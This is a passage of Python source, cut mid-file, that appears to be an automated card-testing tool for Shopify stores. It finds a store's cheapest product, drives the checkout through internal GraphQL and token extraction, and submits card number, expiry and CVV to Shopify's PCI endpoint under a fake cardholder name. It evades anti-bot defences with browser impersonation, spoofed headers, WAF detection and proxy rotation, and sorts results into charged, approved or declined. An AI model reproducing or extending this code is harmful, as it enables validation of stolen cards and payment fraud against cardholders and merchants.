    s = _requests.Session()
    _adapter = _requests.adapters.HTTPAdapter(pool_connections=8, pool_maxsize=64)
    s.mount("https://", _adapter)
    s.mount("http://", _adapter)
    if proxy_url:
        s.proxies = {"http": proxy_url, "https": proxy_url}
    s.headers.update({"User-Agent": _UA, "Accept": "application/json"})
    return s

def humanize_gateway(raw: str) -> str:
    lo = raw.strip().lower()
    if lo in _GATEWAY_DISPLAY:
        return _GATEWAY_DISPLAY[lo]
    words = raw.replace("_", " ").replace("-", " ").split()
    return " ".join(w.capitalize() for w in words) if words else raw

def extract_gateway(*bodies: str) -> str:
    for body in bodies:
        if not body:
            continue
        for pat in _GW_PATS:
            m = pat.search(body)
            if m:
                name = m.group(1).strip()
                if name:
                    return humanize_gateway(name)
    return "Shopify Payments"

def classify_proxy(result, proxy_url: str) -> str:
    if not proxy_url:
        return "N/A"
    if result is None:
        return "dead"
    if result.get("status") in ("charged", "approved", "declined"):
        return "live"
    if not result.get("error"):
        return "live"
    s = str(result["error"]).lower()
    dead = ["407","proxy auth","429","rate limit","cloudflare","cf-ray","tls",
            "x509","ssl","no such host","dns","connection reset","connection refused",
            "eof","broken pipe","timeout","deadline","blocked","403"]
    if any(h in s for h in dead):
        return "dead"
    return "dead" if result.get("retryable") else "live"

# ══════════════════════════════ EXTRACTION FUNCTIONS ═════════════════════════

def ext_storefront_token(html: str) -> str:
    for pat in _STOREFRONT_TOKEN_RES:
        m = pat.search(html)
        if m:
            return m.group(1)
    return ""

def ext_checkout_token(url: str) -> str:
    m = _CHECKOUT_TOKEN_RE.search(url)
    return m.group(1) if m else ""

def ext_session_token(html: str) -> str:
    if not html:
        return ""
    for pat in _SESSION_TOKEN_RES:
        m = pat.search(html)
        if m:
            return _html.unescape(m.group(1)).strip('"')
    return ""

def ext_pat_id(html: str) -> str:
    m = _PAT_ID_RE.search(_html.unescape(html))
    return m.group(1) if m else ""

def ext_stable_id(html: str) -> str:
    m = _STABLE_ID_RE.search(_html.unescape(html))
    return m.group(1) if m else ""

def ext_commit_sha(html: str) -> str:
    m = _COMMIT_SHA_RE.search(_html.unescape(html))
    return m.group(1) if m else ""

def ext_source_token(html: str) -> str:
    if not html:
        return ""
    for pat in _SOURCE_TOKEN_RES:
        m = pat.search(html)
        if m:
            return _html.unescape(m.group(1)).strip('"')
    return ""

def ext_ident_sig(html: str) -> str:
    m = _IDENT_SIG_RE.search(_html.unescape(html))
    return m.group(1) if m else ""

def ext_queue_token(body: str) -> str:
    m = _QUEUE_TOKEN_RE.search(body)
    return m.group(1) if m else ""

def ext_receipt_id(body: str) -> str:
    m = _RECEIPT_ID_RE.search(body)
    return m.group(1) if m else ""

def ext_receipt_session_token(body: str) -> str:
    m = _RECEIPT_SESS_RE.search(body)
    return m.group(1) if m else ""

def ext_pci_session_id(body: str) -> str:
    body = (body or "").strip()
    if body:
        try:
            obj = json.loads(body)
            if isinstance(obj, dict):
                for key in ("id", "sessionId", "session_id", "token"):
                    sid = obj.get(key)
                    if isinstance(sid, str) and sid:
                        return sid
        except Exception:
            pass
    m = _PCI_SESSION_ID_RE.search(body)
    return m.group(1) if m else ""

def ext_delivery_handle(body: str) -> str:
    try:
        data = json.loads(body) if isinstance(body, str) else body
        if isinstance(data, dict):
            for root in (data.get("data", {}), data):
                for container_key in ("negotiation", "submitForCompletion", "proposal"):
                    cont = root.get(container_key) or {}
                    res = cont.get("result") if isinstance(cont, dict) and "result" in cont else cont
                    for pkey in ("sellerProposal", "buyerProposal", "proposal"):
                        prop = (res.get(pkey) if isinstance(res, dict) else {}) or {}
                        deliv = prop.get("delivery") or {}
                        for ln in deliv.get("deliveryLines") or []:
                            strat = ln.get("selectedDeliveryStrategy") or {}
                            h = strat.get("handle") or (strat.get("deliveryStrategyByHandle") or {}).get("handle")
                            if h and h != "shop_promise":
                                return str(h)
                            for avail in ln.get("availableDeliveryStrategies") or []:
                                h = avail.get("handle") or (avail.get("deliveryStrategyByHandle") or {}).get("handle")
                                if h and h != "shop_promise":
                                    return str(h)
                            for s in ln.get("deliveryStrategies") or []:
                                h = s.get("handle") or (s.get("deliveryStrategyByHandle") or {}).get("handle")
                                if h and h != "shop_promise":
                                    return str(h)
                        deliv_exp = prop.get("deliveryExpectations") or {}
                        for de in deliv_exp.get("deliveryExpectations") or []:
                            dh = de.get("deliveryStrategyHandle")
                            if dh and dh != "shop_promise":
                                return str(dh)
                        for macro in deliv.get("deliveryMacros") or []:
                            for mh in macro.get("deliveryStrategyHandles") or []:
                                if mh and mh != "shop_promise":
                                    return str(mh)
    except Exception:
        pass

    m = _DELIVERY_STRAT_HANDLE_RE.search(body)
    if m and m.group(1) != "shop_promise":
        return m.group(1)

    for rx in (_DELIVERY_HASH_RE, _DELIVERY_BY_HANDLE_RE, _DELIVERY_AVAIL_RE, _DELIVERY_HANDLE_RE, _DELIVERY_RE, _DELIVERY_FB_RE):
        m = rx.search(body)
        if m and m.group(1) != "shop_promise":
            return m.group(1)
    return ""

def ext_signed_handles(body: str) -> list:
    return _SIGNED_HANDLE_RE.findall(body)

def ext_shipping_amount(body: str) -> str:
    m = _SHIPPING_AMT_RE.search(body)
    return m.group(1) if m else "0.00"

def _amt_positive(s) -> bool:
    try:
        return float(str(s).replace(",", "").strip()) > 0
    except (TypeError, ValueError):
        return False

def ext_checkout_total(body: str) -> str:
    zero_val = ""
    for rx in (_CHECKOUT_TOTAL_RE, _SELLER_TOTAL_RE):
        m = rx.search(body)
        if not m:
            continue
        if _amt_positive(m.group(1)):
            return m.group(1)
        if not zero_val:
            zero_val = m.group(1)
    return zero_val

def ext_running_total(body: str) -> str:
    m = _RUNNING_TOTAL_RE.search(body)
    if m and _amt_positive(m.group(1)):
        return m.group(1)
    return m.group(1) if m else ""

def ext_seller_tax_amt(body: str) -> str:
    m = _SELLER_TAX_AMT_RE.search(body)
    return m.group(1) if m else ""

def ext_seller_tax_included_amt(body: str) -> str:
    m = _SELLER_TAX_INCL_RE.search(body)
    return m.group(1) if m else ""

def ext_seller_currency(body: str) -> str:
    m = _SELLER_CUR_RE.search(body)
    return m.group(1) if m else ""

def ext_seller_country(body: str) -> str:
    m = _SELLER_CTR_RE.search(body)
    return m.group(1) if m else ""

def ext_payment_flex_terms_id(body: str) -> str:
    m = _PAY_FLEX_TERMS_RE.search(body)
    return m.group(1) if m else ""

def ext_payment_method_id(body: str) -> str:
    for pat in (_PMI_RE, _PMI2_RE, _PMI3_RE):
        m = pat.search(body)
        if m:
            return m.group(1)
    return ""

def ext_seller_merch_price(body: str) -> str:
    m = _MERCH_PRICE_RE.search(body)
    return m.group(1) if m else ""

def ext_currency_from_html(html: str) -> str:
    u = _html.unescape(html)
    for pat in [re.compile(r'"currency"\s*:\s*"([A-Z]{3})"'),
                re.compile(r'"currencyCode"\s*:\s*"([A-Z]{3})"'),
                re.compile(r'"presentmentCurrency"\s*:\s*"([A-Z]{3})"'),
                re.compile(r'"shopCurrency"\s*:\s*"([A-Z]{3})"')]:
        m = pat.search(u)
        if m and m.group(1) not in ("", "XXX"):
            return m.group(1).upper()
    return ""

def ext_actions_js_url(html: str, shop_url: str) -> str:
    m = _ACTIONS_JS_RE.search(html)
    return shop_url + m.group(1) if m else ""

def ext_processing_js_urls(html: str, shop_url: str) -> list:
    seen, urls = set(), []
    for pat in _PROC_JS_PATS:
        for m in pat.finditer(html):
            u = shop_url + m.group(1)
            if u not in seen:
                seen.add(u); urls.append(u)
    for m in _ALL_JS_RE.finditer(html):
        u = shop_url + m.group(1)
        if u in seen or _SKIP_JS_RE.search(m.group(1)):
            continue
        seen.add(u); urls.append(u)
    return urls

def ext_proposal_id(js: str) -> str:
    m = _PROPOSAL_ID_RE.search(js)
    return m.group(1) if m else ""

def ext_submit_id(js: str) -> str:
    m = _SUBMIT_ID_RE.search(js)
    return m.group(1) if m else ""

def ext_receipt_status_code(body: str, receipt_type: str) -> str:
    if receipt_type in ("SuccessfulReceipt", "ProcessedReceipt"):
        return "ORDER_PAID"
    if receipt_type == "ProcessingReceipt":
        return "PROCESSING"
    mp = _PAY_ERR_CODE_RE.search(body)
    m  = mp or _ERROR_CODE_RE.search(body)
    if m:
        code = m.group(1)
        if "CAPTCHA" in code:
            return "CAPTCHA_REQUIRED"
        return code
    if "CAPTCHA" in body:
        return "CAPTCHA_REQUIRED"
    if receipt_type == "FailedReceipt":
        return "CARD_DECLINED"
    return "UNKNOWN"

# ══════════════════════════════ PRODUCT FETCHING ═════════════════════════════

def fetch_products_resilient(domain: str, session):
    headers = {
        "accept": "application/json, text/plain, */*",
        "referer": domain + "/",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
    }

    for endpoint in (
        "/collections/all/products.json?sort_by=price-ascending&limit=250",
        "/products.json?sort_by=price-ascending&limit=250",
        "/products.json?limit=250",
        "/collections/all/products.json?limit=250",
    ):
        try:
            r = session.get(domain + endpoint, headers=headers, timeout=15, allow_redirects=True)
            if r.status_code == 403 and _looks_like_waf_block(r.text):
                return [], False, "waf blocked"
            if r.status_code == 200:
                if r.url:
                    rp = urlparse(str(r.url))
                    new_domain = f"{rp.scheme}://{rp.netloc}"
                    if new_domain != domain:
                        domain = new_domain
                try:
                    prods = r.json().get("products", [])
                    if prods:
                        return prods, False, None
                except Exception:
                    pass
        except Exception as e:
            if _is_proxy_failure(e):
                return [], False, "proxy unreachable"
            return [], False, str(e)[:120]

    try:
        r = session.get(domain + "/collections/all", headers={
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "referer": domain + "/",
        }, timeout=15, allow_redirects=True)
        if r.status_code == 200:
            handles = list(dict.fromkeys(re.findall(r'/products/([a-zA-Z0-9\-_]+)', r.text)))
            handles = [h for h in handles if h not in ("search", "all", "cart", "account")]
            prods = []
            for h in handles[:8]:
                if _over():
                    break
                try:
                    p_resp = session.get(f"{domain}/products/{h}.js", headers=headers, timeout=10, allow_redirects=True)
                    if p_resp.status_code == 200:
                        prods.append(p_resp.json())
                except Exception:
                    pass
            if prods:
                return prods, True, None
    except Exception as e:
        if _is_proxy_failure(e):
            return [], False, "proxy unreachable"
        return [], False, str(e)[:120]

    try:
        r = session.get(domain + "/sitemap_products_1.xml", timeout=15, allow_redirects=True)
        if r.status_code == 200:
            locs = re.findall(r'<loc>[^<]*/products/([^<?#/]+)', r.text)
            handles = list(dict.fromkeys(locs))
            prods = []
            for h in handles[:8]:
                if _over():
                    break
                try:
                    p_resp = session.get(f"{domain}/products/{h}.js", headers=headers, timeout=10, allow_redirects=True)
                    if p_resp.status_code == 200:
                        prods.append(p_resp.json())
                except Exception:
                    pass
            if prods:
                return prods, True, None
    except Exception as e:
        if _is_proxy_failure(e):
            return [], False, "proxy unreachable"
        return [], False, str(e)[:120]

    return [], False, None

def _is_proxy_failure(exc) -> bool:
    s = str(exc).lower()
    return any(k in s for k in ("proxy", "tunnel failed", "cannot connect to proxy",
                                "586", "502 bad gateway", "503 service unavailable",
                                "max retries exceeded", "connrefused", "connection reset"))

_STEP0_RETRY_HINTS = (
    "proxy unreachable", "proxy", "tunnel failed", "waf blocked",
    "max retries exceeded", "connrefused", "connection refused",
    "connection reset", "connection aborted", "broken pipe", "eof",
    "temporary failure", "name or service not known", "no such host",
    "dns", "timed out", "timeout", "read timeout", "i/o timeout",
    "502", "503", "504", "429", "too many requests",
    "no available products at", "no available variants at",
)

def step0_retryable(err: str) -> bool:
    lo = (err or "").lower()
    return any(h in lo for h in _STEP0_RETRY_HINTS)

def whop_pick_proxy(country: str = "") -> str:
    return ""

def rotate_step0_proxy(current: str, country: str) -> str:
    if not current:
        return ""
    try:
        fresh = whop_pick_proxy(country)
    except Exception:
        return ""
    return fresh if fresh and fresh != current else ""

_WAF_MARKERS = ("just a moment", "checking your browser", "enable javascript",
                "attention required", "access denied", "cf-chl", "incapsula",
                "you are unable to access", "blocked", "403 forbidden",
                "verify you are human")

def _looks_like_waf_block(body: str) -> bool:
    low = (body or "").lower()[:20000]
    return any(m in low for m in _WAF_MARKERS)

def find_all_variants(sess, shop_url: str, api_sess=None):
    session = sess or api_sess
    prods, is_cents, why1 = fetch_products_resilient(shop_url, session)
    why2 = None
    if not prods and api_sess and api_sess is not session:
        prods, is_cents, why2 = fetch_products_resilient(shop_url, api_sess)

    why = why1 or why2
    if not prods:
        if why:
            raise Exception(f"no available products at {shop_url} ({why})")
        raise Exception(f"no available products at {shop_url}")

    candidates = []
    for p in prods:
        for v in p.get("variants", []):
            if not v.get("available", True) or not v.get("requires_shipping", True):
                continue
            try:
                pr = float(str(v.get("price", "0")).replace(",", ""))
                if is_cents:
                    pr = pr / 100.0
                if pr > 0:
                    price_str = f"{pr:.2f}" if is_cents else str(v.get("price", "0")).replace(",", "")
                    candidates.append({
                        "product_title": p.get("title", ""),
                        "product_id": str(p.get("id", "")),
                        "variant_id": str(v["id"]),
                        "price": pr,
                        "price_str": price_str,
                        "currency": "",
                        "handle": p.get("handle", ""),
                        "requires_shipping": True,
                    })
            except (ValueError, TypeError):
                continue

    if not candidates:
        for p in prods:
            for v in p.get("variants", []):
                if not v.get("available", True):
                    continue
                try:
                    pr = float(str(v.get("price", "0")).replace(",", ""))
                    if is_cents:
                        pr = pr / 100.0
                    if pr > 0:
                        price_str = f"{pr:.2f}" if is_cents else str(v.get("price", "0")).replace(",", "")
                        candidates.append({
                            "product_title": p.get("title", ""),
                            "product_id": str(p.get("id", "")),
                            "variant_id": str(v["id"]),
                            "price": pr,
                            "price_str": price_str,
                            "currency": "",
                            "handle": p.get("handle", ""),
                            "requires_shipping": v.get("requires_shipping", True),
                        })
                except (ValueError, TypeError):
                    continue

    if not candidates:
        raise Exception(f"no available variants at {shop_url}")

    candidates.sort(key=lambda x: x["price"])
    return candidates

# ══════════════════════════════ CHECKOUT STEP FUNCTIONS ══════════════════════

def _ckh(shop_url, checkout_url, checkout_token, session_token, build_id, source_token,
         extra=None):
    h = {
        "accept": "application/json",
        "accept-language": "en-US",
        "content-type": "application/json",
        "origin": shop_url,
        "priority": "u=1, i",
        "referer": checkout_url,
        "sec-ch-ua": _SEC_CH_UA,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
        "user-agent": _UA,
        "x-checkout-one-session-token": session_token,
        "x-checkout-web-build-id": build_id,
        "x-checkout-web-deploy-stage": "production",
        "x-checkout-web-server-handling": "fast",
        "x-checkout-web-server-rendering": "yes",
        "x-checkout-web-source-id": source_token,
    }
    if extra:
        h.update(extra)
    return h

def step1_add_to_cart(sess, shop_url, variant_id):
    host = urlparse(shop_url).hostname or ""
    try:
        if "_shopify_y" not in sess.cookies:
            sess.cookies.set("_shopify_y", uuid.uuid4().hex, domain=host)
        if "_shopify_s" not in sess.cookies:
            sess.cookies.set("_shopify_s", uuid.uuid4().hex, domain=host)
    except Exception:
        pass

    r = sess.post(shop_url + "/cart/add.js",
                  content=json.dumps({"id": variant_id, "quantity": 1}),
                  headers={
                      "accept": "application/json, text/javascript, */*; q=0.01",
                      "accept-language": "en-US,en;q=0.9",
                      "content-type": "application/json",
                      "origin": shop_url,
                      "referer": shop_url + "/",
                      "sec-ch-ua": _SEC_CH_UA,
                      "sec-ch-ua-mobile": "?0",
                      "sec-ch-ua-platform": '"Windows"',
                      "sec-fetch-dest": "empty",
                      "sec-fetch-mode": "cors",
                      "sec-fetch-site": "same-origin",
                      "x-requested-with": "XMLHttpRequest",
                      "user-agent": _UA,
                  },
                  timeout=20)
    if r.status_code != 200:
        raise Exception(f"POST /cart/add.js returned {r.status_code}")
    time.sleep(random.uniform(0.12, 0.25))
    r2 = sess.get(shop_url + "/checkout",
                  headers={
                      "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                      "accept-language": "en-US,en;q=0.9",
                      "referer": shop_url + "/cart",
                      "sec-ch-ua": _SEC_CH_UA,
                      "sec-ch-ua-mobile": "?0",
                      "sec-ch-ua-platform": '"Windows"',
                      "sec-fetch-dest": "document",
                      "sec-fetch-mode": "navigate",
                      "sec-fetch-site": "same-origin",
                      "sec-fetch-user": "?1",
                      "upgrade-insecure-requests": "1",
                      "user-agent": _UA,
                  },
                  timeout=20)
    checkout_url   = str(r2.url)
    checkout_html  = r2.text
    checkout_token = ext_checkout_token(checkout_url)
    session_token  = ext_session_token(checkout_html)
    return checkout_url, checkout_token, session_token, checkout_html

def step2_fetch_pat(sess, shop_url, checkout_url, pat_id):
    r = sess.get(f"{shop_url}/private_access_tokens?id={quote(pat_id)}&checkout_type=c1",
                 headers={"accept":"*/*","accept-language":"en-US,en;q=0.9",
                          "referer":checkout_url,"sec-ch-ua":_SEC_CH_UA,
                          "sec-ch-ua-mobile":"?0","sec-ch-ua-platform":'"Windows"',
                          "sec-fetch-dest":"empty","sec-fetch-mode":"cors",
                          "sec-fetch-site":"same-origin","user-agent":_UA},
                 timeout=15)
    return r.status_code, r.text

def step3_fetch_actions_js(sess, actions_url, shop_url):
    r = sess.get(actions_url, headers={
        "accept":"*/*","accept-language":"en-US,en;q=0.9","origin":shop_url,
        "priority":"u=1","sec-ch-ua":_SEC_CH_UA,"sec-ch-ua-mobile":"?0",
        "sec-ch-ua-platform":'"Windows"',"sec-fetch-dest":"script",
        "sec-fetch-mode":"cors","sec-fetch-site":"same-origin","user-agent":_UA},
        timeout=20)
    if r.status_code != 200:
        raise Exception(f"actions JS returned HTTP {r.status_code}")
    return r.text

_ACTION_ID_CACHE = {}
_ACTION_ID_CACHE_MAX = 32
_ACTION_SCAN_WAVE = 64

_CDN_SESSION = _requests.Session()

_PRELOAD_RE = re.compile(r'href="([^"]+\.js)"[^>]*rel="modulepreload"')

def _asset_urls_from_html(html: str) -> list:
    pre    = _PRELOAD_RE.findall(html)
    chunks = re.findall(r'(/cdn/shopifycloud/checkout-web/assets/[A-Za-z0-9_/.-]+\.js)', html)
    seen, out = set(), []
    for u in pre + chunks:
        if u not in seen:
            seen.add(u)
            out.append(u)
    return out

def _fetch_asset_body(full_url: str) -> str:
    try:
        r = _CDN_SESSION.get(full_url, timeout=8, headers={"user-agent": _UA, "accept": "*/*"})
        if r.status_code == 200:
            return r.text
    except Exception:
        pass
    return ""

def step3_locate_action_ids(shop_url: str, html: str, build_id: str = "") -> str:
    from concurrent.futures import ThreadPoolExecutor
    urls = _asset_urls_from_html(html)
    if not urls:
        raise Exception("no checkout bundles referenced by the checkout page")
    key = build_id or ("u" + hashlib.sha1("|".join(sorted(urls)).encode()).hexdigest()[:20])
    cached = _ACTION_ID_CACHE.get(key)
    if cached:
        return cached
    props = ""
    subs = ""
    for i in range(0, len(urls), _ACTION_SCAN_WAVE):
        if _over():
            break
        with ThreadPoolExecutor(max_workers=_ACTION_SCAN_WAVE) as ex:
            bodies = list(ex.map(lambda u: _fetch_asset_body(shop_url + u),
                                 urls[i:i + _ACTION_SCAN_WAVE]))
        for body in bodies:
            if not body:
                continue
            if not props and _PROPOSAL_ID_RE.search(body):
                props = body
            if not subs and _SUBMIT_ID_RE.search(body):
                subs = body
            if props and subs:
                break
        if props and subs:
            break
    if not props or not subs:
        raise Exception("Proposal/Submit ids not found in checkout bundles")
    js_body = props if props is subs else props + "\n" + subs
    if len(_ACTION_ID_CACHE) >= _ACTION_ID_CACHE_MAX:
        _ACTION_ID_CACHE.pop(next(iter(_ACTION_ID_CACHE)))
    _ACTION_ID_CACHE[key] = js_body
    return js_body

def _build_proposal(session_token, queue_token, stable_id, variant_id,
                    proposal_id, email=None, addr=None, requires_shipping: bool = True):
    qt = "null" if queue_token is None else json.dumps(queue_token)

    if addr:
        dest = f'''"destination": {{
              "partialStreetAddress": {{
                "address1": {json.dumps(addr["address1"])},
                "address2": {json.dumps(addr["address2"])},
                "city": {json.dumps(addr["city"])},
                "countryCode": {json.dumps(addr["country_code"])},
                "postalCode": {json.dumps(addr["postal_code"])},
                "firstName": {json.dumps(addr["first_name"])},
                "lastName": {json.dumps(addr["last_name"])},
                "zoneCode": {json.dumps(addr["zone_code"])},
                "phone": {json.dumps(addr["phone"])},
                "oneTimeUse": false
              }}
            }}'''
        billing = f'''"billingAddress": {{
        "streetAddress": {{
          "address1": {json.dumps(addr["address1"])},
          "address2": {json.dumps(addr["address2"])},
          "city": {json.dumps(addr["city"])},
          "countryCode": {json.dumps(addr["country_code"])},
          "postalCode": {json.dumps(addr["postal_code"])},
          "firstName": {json.dumps(addr["first_name"])},
          "lastName": {json.dumps(addr["last_name"])},
          "zoneCode": {json.dumps(addr["zone_code"])},
          "phone": {json.dumps(addr["phone"])}
        }}
      }}'''
    else:
        dest = '''"destination": {
              "partialStreetAddress": {
                "address1": "", "city": "", "countryCode": "US",
                "lastName": "", "phone": "", "oneTimeUse": false
              }
            }'''
        billing = '''"billingAddress": {
        "streetAddress": {
          "address1": "", "city": "", "countryCode": "US",
          "lastName": "", "phone": ""
        }
      }'''

    email_block = ""
    if email is not None:
        changed = "false" if addr else "true"
        email_block = f',\n      "email": {json.dumps(email)},\n      "emailChanged": {changed}'

    if not requires_shipping:
        deliv_lines_block = f'''"destination": null,
          "selectedDeliveryStrategy": {{
            "deliveryStrategyMatchingConditions": {{
              "estimatedTimeInTransit": {{"any": true}},
              "shipments": {{"any": true}}
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"any": true}},
          "deliveryMethodTypes": ["NONE"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": false'''
    else:
        deliv_lines_block = f'''{dest},
          "selectedDeliveryStrategy": {{
            "deliveryStrategyMatchingConditions": {{
              "estimatedTimeInTransit": {{"any": true}},
              "shipments": {{"any": true}}
            }},
            "options": {{}}
          }},
          "targetMerchandiseLines": {{"any": true}},
          "deliveryMethodTypes": ["SHIPPING"],
          "expectedTotalPrice": {{"any": true}},
          "destinationChanged": true'''

    return f'''{{
  "variables": {{
    "sessionInput": {{"sessionToken": {json.dumps(session_token)}}},
    "queueToken": {qt},
    "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
    "delivery": {{
      "deliveryLines": [
        {{
          {deliv_lines_block}
        }}
      ],
      "noDeliveryRequired": [],
      "useProgressiveRates": false,
      "prefetchShippingRatesStrategy": null,
      "supportsSplitShipping": true
    }},
    "deliveryExpectations": {{"deliveryExpectationLines": []}},
    "merchandise": {{
      "merchandiseLines": [
        {{
          "stableId": {json.dumps(stable_id)},
          "merchandise": {{
            "productVariantReference": {{
              "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
              "variantId": "gid://shopify/ProductVariant/{variant_id}",
              "properties": [],
              "sellingPlanId": null,
              "sellingPlanDigest": null
            }}
          }},
          "quantity": {{"items": {{"value": 1}}}},
          "expectedTotalPrice": {{"any": true}},
          "lineComponentsSource": null,
          "lineComponents": []
        }}
      ]
    }},
    "memberships": {{"memberships": []}},
    "payment": {{
      "totalAmount": {{"any": true}},
      "paymentLines": [],
      {billing}
    }},
    "buyerIdentity": {{
      "customer": {{"presentmentCurrency": "USD", "countryCode": "US"}}{email_block},
      "phoneCountryCode": "US",
      "marketingConsent": [],
      "shopPayOptInPhone": {{"countryCode": "US"}},
      "rememberMe": false
    }},
    "tip": {{"tipLines": []}},
    "poNumber": null,
    "taxes": {{
      "proposedAllocations": null,
      "proposedTotalAmount": {{"any": true}},
      "proposedTotalIncludedAmount": null,
      "proposedMixedStateTotalAmount": null,
      "proposedExemptions": []
    }},
    "note": {{"message": null, "customAttributes": []}},
    "localizationExtension": {{"fields": []}},
    "nonNegotiableTerms": null,
    "scriptFingerprint": {{
      "signature": null, "signatureUuid": null,
      "lineItemScriptChanges": [], "paymentScriptChanges": [], "shippingScriptChanges": []
    }},
    "optionalDuties": {{"buyerRefusesDuties": false}},
    "cartMetafields": [],
    "includeTaxStrategyLines": false
  }},
  "operationName": "Proposal",
  "id": {json.dumps(proposal_id)}
}}'''

def send_proposal(sess, shop_url, checkout_url, checkout_token, session_token,
                  stable_id, variant_id, price, proposal_id, build_id, source_token,
                  currency, country, queue_token=None, email=None, addr=None,
                  requires_shipping: bool = True):
    payload = _build_proposal(session_token, queue_token, stable_id, variant_id,
                              proposal_id, email=email, addr=addr,
                              requires_shipping=requires_shipping)
    payload = patch_payload(payload, currency, country)
    h = _ckh(shop_url, checkout_url, checkout_token, session_token, build_id, source_token)
    r = sess.post(shop_url + "/checkouts/internal/graphql/persisted?operationName=Proposal",
                  content=payload, headers=h, timeout=30)
    return r.status_code, r.text

def step9_pci(ident_sig, card_number, card_month, card_year, card_cvv,
              shop_domain, proxy_url=""):
    payload = json.dumps({
        "credit_card": {
            "number": card_number, "month": card_month, "year": card_year,
            "verification_value": card_cvv, "start_month": None, "start_year": None,
            "issue_number": "", "name": "james anderson"
        },
        "payment_session_scope": shop_domain
    })
    pci = curl_requests.Session(impersonate="chrome120")
    try:
        if proxy_url:
            pci.proxies = {"http": proxy_url, "https": proxy_url}
        r = pci.post("https://checkout.pci.shopifyinc.com/sessions", content=payload, headers={
            "accept": "application/json",
            "accept-language": "en-US,en;q=0.9",
            "content-type": "application/json",
            "origin": "https://checkout.pci.shopifyinc.com",
            "priority": "u=1, i",
            "referer": "https://checkout.pci.shopifyinc.com/build/a8e4a94/number-ltr.html?identifier=&locationURL=",
            "sec-ch-ua": _SEC_CH_UA,
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "sec-fetch-storage-access": "active",
            "shopify-identification-signature": ident_sig,
            "user-agent": _UA,
        }, timeout=30)
    finally:
        pci.close()
    return r.status_code, r.text

def send_submit(sess, shop_url, checkout_url, checkout_token, session_token,
                stable_id, variant_id, price, submit_id, build_id, source_token,
                queue_token, email, addr, delivery_handle, shipping_amount,
                total_amount, pci_session_id, attempt_token, currency, country,
                signed_handles, card_number, payment_method_id,
                payment_flex_terms_id="", seller_tax_amt="", seller_tax_included_amt="",
                requires_shipping: bool = True):

    card_bin     = card_number[:8]
    page_id      = generate_page_id()
    pft = ""
    if payment_flex_terms_id:
        pft = f''',
        "paymentFlexibilityTermsId": {json.dumps(payment_flex_terms_id)}'''

    if seller_tax_included_amt:
        taxes_block = f'''"taxes": {{
        "proposedAllocations": null,
        "proposedTotalAmount": null,
        "proposedTotalIncludedAmount": {{"value": {{"amount": {json.dumps(seller_tax_included_amt)}, "currencyCode": "USD"}}}},
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }}'''
    elif seller_tax_amt:
        taxes_block = f'''"taxes": {{
        "proposedAllocations": null,
        "proposedTotalAmount": {{"value": {{"amount": {json.dumps(seller_tax_amt)}, "currencyCode": "USD"}}}},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }}'''
    else:
        taxes_block = '''"taxes": {
        "proposedAllocations": null,
        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": "USD"}},
        "proposedTotalIncludedAmount": null,
        "proposedMixedStateTotalAmount": null,
        "proposedExemptions": []
      }'''

    if delivery_handle:
        strategy_block = f'''"selectedDeliveryStrategy": {{
          "deliveryStrategyByHandle": {{
            "handle": {json.dumps(delivery_handle)},
            "customDeliveryRate": false
          }},
          "options": {{}}
        }}'''
    else:
        strategy_block = f'''"selectedDeliveryStrategy": {{
          "deliveryStrategyMatchingConditions": {{
            "estimatedTimeInTransit": {{"any": true}},
            "shipments": {{"any": true}}
          }},
          "options": {{}}
        }}'''

    if not requires_shipping:
        dest_val = "null"
        method_types = '["NONE"]'
        handles_json = "[]"
    else:
        dest_val = f'''{{"streetAddress": {{"address1": {json.dumps(addr["address1"])}, "address2": {json.dumps(addr["address2"])}, "city": {json.dumps(addr["city"])}, "countryCode": {json.dumps(addr["country_code"])}, "postalCode": {json.dumps(addr["postal_code"])}, "firstName": {json.dumps(addr["first_name"])}, "lastName": {json.dumps(addr["last_name"])}, "zoneCode": {json.dumps(addr["zone_code"])}, "phone": {json.dumps(addr["phone"])}, "oneTimeUse": false}}}}'''
        method_types = '["SHIPPING"]'
        handles_json = json.dumps([{"signedHandle": h} for h in signed_handles])

    payload = f'''{{
  "variables": {{
    "input": {{
      "sessionInput": {{"sessionToken": {json.dumps(session_token)}}},
      "queueToken": {json.dumps(queue_token)},
      "discounts": {{"lines": [], "acceptUnexpectedDiscounts": true}},
      "delivery": {{
        "deliveryLines": [
          {{
            "destination": {dest_val},
            {strategy_block},
            "targetMerchandiseLines": {{"lines": [{{"stableId": {json.dumps(stable_id)}}}]}},
            "deliveryMethodTypes": {method_types},
            "expectedTotalPrice": {{"any": true}},
            "destinationChanged": false
          }}
        ],
        "noDeliveryRequired": [],
        "useProgressiveRates": false,
        "prefetchShippingRatesStrategy": null,
        "supportsSplitShipping": true
      }},
      "deliveryExpectations": {{"deliveryExpectationLines": {handles_json}}},
      "merchandise": {{
        "merchandiseLines": [
          {{
            "stableId": {json.dumps(stable_id)},
            "merchandise": {{
              "productVariantReference": {{
                "id": "gid://shopify/ProductVariantMerchandise/{variant_id}",
                "variantId": "gid://shopify/ProductVariant/{variant_id}",
                "properties": [],
                "sellingPlanId": null,
                "sellingPlanDigest": null
              }}
            }},
            "quantity": {{"items": {{"value": 1}}}},
            "expectedTotalPrice": {{"any": true}},
            "lineComponentsSource": null,
            "lineComponents": []
          }}
        ]
      }},
      "memberships": {{"memberships": []}},
      "payment": {{
        "totalAmount": {{"any": true}},
        "paymentLines": [
          {{
            "paymentMethod": {{
              "directPaymentMethod": {{
